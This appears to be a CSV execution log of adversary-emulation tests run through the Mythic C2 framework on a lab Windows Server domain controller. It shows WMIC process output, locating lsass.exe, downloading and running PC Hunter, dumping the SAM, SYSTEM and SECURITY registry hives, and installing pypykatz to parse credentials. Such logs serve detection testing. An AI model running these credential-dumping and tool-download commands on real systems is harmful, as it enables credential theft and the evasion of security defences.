command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
OSCreationClassName=Win32_OperatingSystem
OSName=Microsoft Windows Server 2022 Standard Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount=272
OtherTransferCount=12844
PageFaults=5079
PageFileUsage=6904
ParentProcessId=5284
PeakPageFileUsage=6980
PeakVirtualSize=2203480174592
PeakWorkingSetSize=19724
Priority=8
PrivatePageCount=7069696
ProcessId=2608
QuotaNonPagedPoolUsage=12
QuotaPagedPoolUsage=192
QuotaPeakNonPagedPoolUsage=13
QuotaPeakPagedPoolUsage=214
ReadOperationCount=1
ReadTransferCount=60
SessionId=1
Status=
TerminationDate=
ThreadCount=4
UserModeTime=156250
VirtualSize=2203468083200
WindowsVersion=10.0.20348
WorkingSetSize=18194432
WriteOperationCount=0
WriteTransferCount=0


Caption=cmd.exe
CommandLine=cmd.exe /S /c wmic process get /format:list

CreationClassName=Win32_Process
CreationDate=20240905145613.034793-240
CSCreationClassName=Win32_ComputerSystem
CSName=GORILLA-DC01-20
Description=cmd.exe
ExecutablePath=C:\Windows\SYSTEM32\cmd.exe
ExecutionState=
Handle=5460
HandleCount=175
InstallDate=
KernelModeTime=0
MaximumWorkingSetSize=1380
MinimumWorkingSetSize=200
Name=cmd.exe
OSCreationClassName=Win32_OperatingSystem
OSName=Microsoft Windows Server 2022 Standard Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount=68
OtherTransferCount=2052
PageFaults=1086
PageFileUsage=4288
ParentProcessId=5284
PeakPageFileUsage=4288
PeakVirtualSize=2203379388416
PeakWorkingSetSize=4036
Priority=8
PrivatePageCount=4390912
ProcessId=5460
QuotaNonPagedPoolUsage=6
QuotaPagedPoolUsage=76
QuotaPeakNonPagedPoolUsage=11
QuotaPeakPagedPoolUsage=76
ReadOperationCount=0
ReadTransferCount=0
SessionId=1
Status=
TerminationDate=
ThreadCount=3
UserModeTime=0
VirtualSize=2203379388416
WindowsVersion=10.0.20348
WorkingSetSize=4132864
WriteOperationCount=0
WriteTransferCount=0


Caption=conhost.exe
CommandLine=\??\C:\Windows\system32\conhost.exe 0x4
CreationClassName=Win32_Process
CreationDate=20240905145613.038443-240
CSCreationClassName=Win32_ComputerSystem
CSName=GORILLA-DC01-20
Description=conhost.exe
ExecutablePath=C:\Windows\system32\conhost.exe
ExecutionState=
Handle=5164
HandleCount=124
InstallDate=
KernelModeTime=0
MaximumWorkingSetSize=1380
MinimumWorkingSetSize=200
Name=conhost.exe
OSCreationClassName=Win32_OperatingSystem
OSName=Microsoft Windows Server 2022 Standard Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount=68
OtherTransferCount=3114
PageFaults=3686
PageFileUsage=6672
ParentProcessId=5460
PeakPageFileUsage=6684
PeakVirtualSize=2203459887104
PeakWorkingSetSize=14364
Priority=8
PrivatePageCount=6832128
ProcessId=5164
QuotaNonPagedPoolUsage=11
QuotaPagedPoolUsage=176
QuotaPeakNonPagedPoolUsage=11
QuotaPeakPagedPoolUsage=193
ReadOperationCount=1
ReadTransferCount=60
SessionId=1
Status=
TerminationDate=
ThreadCount=5
UserModeTime=156250
VirtualSize=2203450961920
WindowsVersion=10.0.20348
WorkingSetSize=14708736
WriteOperationCount=0
WriteTransferCount=0


Caption=WMIC.exe
CommandLine=wmic  process get /format:list
CreationClassName=Win32_Process
CreationDate=20240905145613.134013-240
CSCreationClassName=Win32_ComputerSystem
CSName=GORILLA-DC01-20
Description=WMIC.exe
ExecutablePath=C:\Windows\System32\Wbem\WMIC.exe
ExecutionState=
Handle=5524
HandleCount=282
InstallDate=
KernelModeTime=468750
MaximumWorkingSetSize=1380
MinimumWorkingSetSize=200
Name=WMIC.exe
OSCreationClassName=Win32_OperatingSystem
OSName=Microsoft Windows Server 2022 Standard Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount=113
OtherTransferCount=1646
PageFaults=3187
PageFileUsage=2472
ParentProcessId=5460
PeakPageFileUsage=2568
PeakVirtualSize=2203428155392
PeakWorkingSetSize=11744
Priority=8
PrivatePageCount=2531328
ProcessId=5524
QuotaNonPagedPoolUsage=13
QuotaPagedPoolUsage=170
QuotaPeakNonPagedPoolUsage=13
QuotaPeakPagedPoolUsage=170
ReadOperationCount=2
ReadTransferCount=2866
SessionId=1
Status=
TerminationDate=
ThreadCount=6
UserModeTime=156250
VirtualSize=2203428155392
WindowsVersion=10.0.20348
WorkingSetSize=11931648
WriteOperationCount=0
WriteTransferCount=0


Caption=bginfo.exe
CommandLine=""C:\ludus\background\bginfo.exe"" /accepteula C:\ludus\background\red.bgi /silent /timer:0
CreationClassName=Win32_Process
CreationDate=20240905145613.279165-240
CSCreationClassName=Win32_ComputerSystem
CSName=GORILLA-DC01-20
Description=bginfo.exe
ExecutablePath=C:\ludus\background\bginfo.exe
ExecutionState=
Handle=1340
HandleCount=238
InstallDate=
KernelModeTime=156250
MaximumWorkingSetSize=1380
MinimumWorkingSetSize=200
Name=bginfo.exe
OSCreationClassName=Win32_OperatingSystem
OSName=Microsoft Windows Server 2022 Standard Evaluation|C:\Windows|\Device\Harddisk0\Partition1
OtherOperationCount=150
OtherTransferCount=2470
PageFaults=3931
PageFileUsage=3080
ParentProcessId=6384
PeakPageFileUsage=3088
PeakVirtualSize=118996992
PeakWorkingSetSize=14948
Priority=8
PrivatePageCount=3153920
ProcessId=1340
QuotaNonPagedPoolUsage=19
QuotaPagedPoolUsage=228
QuotaPeakNonPagedPoolUsage=20
QuotaPeakPagedPoolUsage=229
ReadOperationCount=141
ReadTransferCount=2852
SessionId=1
Status=
TerminationDate=
ThreadCount=7
UserModeTime=937500
VirtualSize=118956032
WindowsVersion=10.0.20348
WorkingSetSize=15306752
WriteOperationCount=0
WriteTransferCount=0



"
"tasklist | findstr lsass
",2024-09-05T18:56:37.549995,success,mythic,Discover Specific Process - tasklist,11ba69ee-902e-4a0f-b3b6-418aed7d7ddb,"Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
Examples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.
",['windows'],shell,300,16,"lsass.exe                      704 Services                   0     58,732 K
"
"if (Test-Path ""c:\Program Files\Process Hacker 2\ProcessHacker.exe"") {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:56:48.331619,success,mythic,Process Discovery - Process Hacker,966f4c16-1925-4d9b-8ce0-01334ee0867d,"Process Hacker can be exploited to infiltrate system processes, identify weak points, or achieve unauthorized control over systems. However, its malicious use can often be flagged by security defenses, rendering it a perilous tool for illegitimate purposes.",['windows'],powershell,300,16,"Test Passed
"
"Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\ProcessHacker.exe""",2024-09-05T18:56:58.557424,success,mythic,Process Discovery - Process Hacker,966f4c16-1925-4d9b-8ce0-01334ee0867d,"Process Hacker can be exploited to infiltrate system processes, identify weak points, or achieve unauthorized control over systems. However, its malicious use can often be flagged by security defenses, rendering it a perilous tool for illegitimate purposes.",['windows'],powershell,300,16,
"if (Get-ChildItem -Path C:\ -Include *PCHunter64* -File -Recurse -ErrorAction SilentlyContinue) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:58:27.810711,success,mythic,Process Discovery - PC Hunter,b4ca838d-d013-4461-bf2c-f7132617b409,"PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",['windows'],powershell,300,16,"Test Failed
"
"Write-Host Downloading PC Hunter
New-Item -Type Directory ""C:\Temp\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://www.snapfiles.com/directdl/PCHunter_free.zip"" -OutFile ""C:\Temp\ExternalPayloads\PCHunter_free.zip""
Expand-Archive -LiteralPath 'C:\Temp\ExternalPayloads\PCHunter_free.zip' -DestinationPath C:\Temp\ExternalPayloads
Write-Host Unzipping Installing Process Hunter",2024-09-05T18:58:43.895319,success,mythic,Process Discovery - PC Hunter,b4ca838d-d013-4461-bf2c-f7132617b409,"PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",['windows'],powershell,300,16,"Downloading PC Hunter
Unzipping Installing Process Hunter
"
"if (Get-ChildItem -Path C:\ -Include *PCHunter64* -File -Recurse -ErrorAction SilentlyContinue) {echo ""Test Passed""} else {echo 'Test Failed'}
",2024-09-05T18:59:13.985439,success,mythic,Process Discovery - PC Hunter,b4ca838d-d013-4461-bf2c-f7132617b409,"PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",['windows'],powershell,300,16,"Test Passed
"
"Start-Process -FilePath ""C:\Temp\ExternalPayloads\PCHunter_free\PChunter64.exe""",2024-09-05T18:59:26.04449,success,mythic,Process Discovery - PC Hunter,b4ca838d-d013-4461-bf2c-f7132617b409,"PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",['windows'],powershell,300,16,
"reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
",2024-09-05T18:59:35.662538,success,mythic,"Registry dump of SAM, creds, and secrets",5c2571d0-1572-416d-9676-812e64ca9f44,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
",['windows'],shell,300,16,"The operation completed successfully.
"
"del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul
",2024-09-05T18:59:46.409588,success,mythic,"Registry dump of SAM, creds, and secrets",5c2571d0-1572-416d-9676-812e64ca9f44,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
",['windows'],shell,300,16,
"if (Get-Command py -errorAction SilentlyContinue) { echo ""Test Passed"" } else { echo 'Test Failed' }
",2024-09-05T18:59:56.082431,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,"Test Passed
"
"if (Test-Path -Path ""C:\temp\ART\..\ExternalPayloads\venv_t1003_002"") { echo ""Test Passed"" } else { echo 'Test Failed' }
",2024-09-05T19:00:06.73961,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,"Test Failed
"
"py -m venv ""C:\temp\ART\..\ExternalPayloads\venv_t1003_002""
",2024-09-05T19:00:42.273213,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,
"if (Test-Path -Path ""C:\temp\ART\..\ExternalPayloads\venv_t1003_002"") { echo ""Test Passed"" } else { echo 'Test Failed' }
",2024-09-05T19:00:53.546323,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,"Test Passed
"
"if (Get-Command ""C:\temp\ART\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz"" -errorAction SilentlyContinue) { echo ""Test Passed"" } else { echo 'Test Failed' }
",2024-09-05T19:01:04.379881,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,"Test Failed
"
"& ""C:\temp\ART\..\ExternalPayloads\venv_t1003_002\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null
",2024-09-05T19:02:41.894296,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,
"if (Get-Command ""C:\temp\ART\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz"" -errorAction SilentlyContinue) { echo ""Test Passed"" } else { echo 'Test Failed' }
",2024-09-05T19:02:52.229542,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],powershell,300,16,"Test Passed
"
